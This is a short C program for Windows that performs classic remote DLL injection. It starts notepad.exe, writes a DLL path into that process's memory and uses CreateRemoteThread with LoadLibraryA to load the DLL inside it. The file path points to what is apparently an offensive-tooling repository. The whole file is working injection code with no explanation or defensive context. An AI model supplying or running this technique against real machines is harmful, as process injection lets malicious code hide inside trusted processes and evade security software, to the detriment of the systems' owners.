
#include <windows.h>

int main(int argc, char *argv[])
{
	// // setup

	PROCESS_INFORMATION pi;
	STARTUPINFOA Startup;
	ZeroMemory(&Startup, sizeof(Startup));
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
	WaitForSingleObject(pi.hProcess, 1 * 1000);

	// //

	char dll_path[] = "Z:\\git\\offensive_c\\bin\\dll_mainexec.dll";

	HANDLE target_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	LPVOID dll_path_address = VirtualAllocEx(target_handle, 0, sizeof(dll_path), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(target_handle, dll_path_address, dll_path, sizeof(dll_path), 0);

	LPTHREAD_START_ROUTINE loadlibrary_address = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	HANDLE th = CreateRemoteThread(target_handle, 0, 0, loadlibrary_address, dll_path_address, 0, 0);

	return 0;
}

